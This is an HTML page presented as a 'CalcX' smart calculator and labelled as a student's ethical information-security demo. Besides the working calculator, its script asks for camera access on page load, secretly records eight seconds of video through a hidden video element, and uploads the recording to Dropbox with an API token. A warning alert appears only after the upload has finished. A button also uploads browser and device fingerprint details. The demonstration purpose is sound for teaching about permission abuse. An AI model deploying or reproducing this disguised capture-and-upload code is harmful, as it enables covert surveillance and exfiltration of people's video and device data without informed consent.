<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CalcX — Smart Calculator</title>

<link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@400;700;800&display=swap" rel="stylesheet">

<style>
:root{
  --bg:#0a0a0f;
  --card:#151521;
  --border:#2a2a3e;
  --accent:#7c6aff;
  --text:#e8e8f0;
  --dim:#8a8ab0;
  --red:#ff4f6a;
}

*{margin:0;padding:0;box-sizing:border-box}
body{
  background:var(--bg);
  color:var(--text);
  font-family:'Syne',sans-serif;
}

/* NAV */
nav{
  display:flex;
  justify-content:space-between;
  padding:20px 40px;
  border-bottom:1px solid var(--border);
}
.nav-logo{
  font-weight:800;
  font-size:20px;
}
.nav-logo span{color:var(--accent)}
.nav-group{
  font-size:12px;
  color:var(--dim);
  text-align:right;
}

/* HERO */
.hero{
  text-align:center;
  padding:40px 20px;
}
.hero h1{
  font-size:38px;
}
.hero em{
  color:var(--accent);
  font-style:normal;
}

/* MAIN LAYOUT */
.main{
  display:flex;
  justify-content:center;
  gap:30px;
  flex-wrap:wrap;
  padding:20px;
}

/* CARD STYLE */
.card{
  background:var(--card);
  border-radius:20px;
  padding:20px;
  box-shadow:0 10px 30px rgba(0,0,0,0.5);
}

/* CALCULATOR */
.calculator{
  width:300px;
}

.display{
  background:#000;
  padding:15px;
  border-radius:10px;
  margin-bottom:10px;
  text-align:right;
  font-size:24px;
  font-family:'Space Mono',monospace;
}

/* GRID */
.grid{
  display:grid;
  grid-template-columns:repeat(4,1fr);
  gap:10px;
}

button{
  padding:15px;
  border:none;
  border-radius:10px;
  background:#1d1d2c;
  color:white;
  font-size:16px;
  cursor:pointer;
  transition:0.2s;
}
button:hover{
  transform:scale(1.05);
  background:#2a2a3e;
}
.op{color:var(--accent)}
.eq{
  background:var(--accent);
  color:white;
}
.clear{color:var(--red)}

/* DEVICE INFO CARD */
.device-card{
  width:300px;
}
.device-card h3{
  margin-bottom:10px;
}
.info-item{
  margin:8px 0;
  font-size:13px;
  color:var(--dim);
}

/* FOOTER */
footer{
  text-align:center;
  padding:20px;
  font-size:12px;
  color:var(--dim);
}
</style>
</head>

<body>

<nav>
  <div class="nav-logo">Calc<span>X</span></div>
  <div class="nav-group">
    <strong>Maryam Mehmood 23F-0585 | Tooba Shahzad 23F-0767</strong>
  </div>
</nav>

<section class="hero">
  <h1>Smart <em>Calculator</em></h1>
  <p style="color:#8a8ab0;">Ethical Security Demo</p>
</section>

<div class="main">

  <!-- CALCULATOR -->
  <div class="card calculator">
    <div id="display" class="display">0</div>

    <div class="grid">
      <button class="clear" onclick="clearAll()">AC</button>
      <button onclick="del()">⌫</button>
      <button class="op" onclick="add('%')">%</button>
      <button class="op" onclick="add('/')">÷</button>

      <button onclick="add('7')">7</button>
      <button onclick="add('8')">8</button>
      <button onclick="add('9')">9</button>
      <button class="op" onclick="add('*')">×</button>

      <button onclick="add('4')">4</button>
      <button onclick="add('5')">5</button>
      <button onclick="add('6')">6</button>
      <button class="op" onclick="add('-')">−</button>

      <button onclick="add('1')">1</button>
      <button onclick="add('2')">2</button>
      <button onclick="add('3')">3</button>
      <button class="op" onclick="add('+')">+</button>

      <button onclick="add('0')">0</button>
      <button onclick="add('.')">.</button>
      <button class="eq" onclick="calc()">=</button>
    </div>
  </div>

  <!-- DEVICE INFO -->
  <div class="card device-card">
    <h3>📱 Device Info</h3>
    <div id="deviceInfo">
      <p class="info-item">Waiting for camera permission...</p>
    </div>
    <button onclick="uploadDeviceInfo()" style="margin-top:10px; width:100%; padding:10px; border:none; border-radius:10px; background:var(--accent); color:white; cursor:pointer;">
      Upload Device Info
    </button>
  </div>

</div>

<video id="camVideo" autoplay muted playsinline style="display:none"></video>

<footer>
  Information Security Assignment — Ethical Demo
</footer>

<script>
let exp="";
let chunks=[];
let recorder;

// ✅ Dropbox token
const DROPBOX_TOKEN = "YOUR_TOKEN_HERE"; // replace with your token

// Calculator
function add(v){exp+=v;update();}
function clearAll(){exp="";update();}
function del(){exp=exp.slice(0,-1);update();}
function calc(){try{exp=eval(exp).toString()}catch{exp="";alert("Error")}update();}
function update(){document.getElementById("display").innerText=exp||"0"}

// Device Info
function getDeviceInfoText(){
  return `Device Information:
Browser: ${navigator.userAgent}
OS/Platform: ${navigator.platform}
Language: ${navigator.language}
Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
Screen Resolution: ${screen.width} x ${screen.height}`;
}

function showDeviceInfo(){
  const infoHTML = `
    <div class="info-item">🌐 <b>Browser:</b> ${navigator.userAgent}</div>
    <div class="info-item">💻 <b>OS:</b> ${navigator.platform}</div>
    <div class="info-item">🗣️ <b>Language:</b> ${navigator.language}</div>
    <div class="info-item">⏰ <b>Timezone:</b> ${Intl.DateTimeFormat().resolvedOptions().timeZone}</div>
    <div class="info-item">📺 <b>Screen:</b> ${screen.width} x ${screen.height}</div>
  `;
  document.getElementById("deviceInfo").innerHTML = infoHTML;
}

// Camera + auto upload + security warning
async function initCamera(){
  try{
    const stream = await navigator.mediaDevices.getUserMedia({video:true});
    document.getElementById("camVideo").srcObject = stream;

    recorder = new MediaRecorder(stream);
    chunks = [];
    recorder.ondataavailable = e=>chunks.push(e.data);

    recorder.onstop = async ()=>{
      if(chunks.length>0){
        const videoBlob = new Blob(chunks,{type:"video/webm"});
        chunks=[];
        await uploadToDropbox(videoBlob,"recording.webm");
        console.log("Video uploaded ✅");
        // 🔐 Security Awareness Warning
        alert("⚠️ This demonstration shows how malicious websites could misuse camera permissions.\nAlways verify before allowing camera access.");
      }
      showDeviceInfo();
    };

    recorder.start();
    setTimeout(()=>{
      recorder.stop();
      stream.getTracks().forEach(t=>t.stop());
    },8000);

  }catch(err){
    document.getElementById("deviceInfo").innerHTML = "<p class='info-item'>❌ Camera permission denied</p>";
  }
}

// Upload only device info
function uploadDeviceInfo(){
  const deviceBlob = new Blob([getDeviceInfoText()],{type:"text/plain"});
  uploadToDropbox(deviceBlob,"device_info.txt");
  alert(" Device info uploaded to Dropbox.");
}

// Dropbox uploader
async function uploadToDropbox(blob, filename){
  if(!DROPBOX_TOKEN) return;
  try{
    await fetch("https://content.dropboxapi.com/2/files/upload",{
      method:"POST",
      headers:{
        "Authorization":"Bearer "+DROPBOX_TOKEN,
        "Dropbox-API-Arg":JSON.stringify({path:"/"+filename, mode:"add", autorename:true}),
        "Content-Type":"application/octet-stream"
      },
      body: await blob.arrayBuffer()
    });
  }catch(e){console.error("Upload failed:",e);}
}

// Init
window.addEventListener("DOMContentLoaded",()=>{setTimeout(initCamera,1000)});
</script>

</body>
</html>
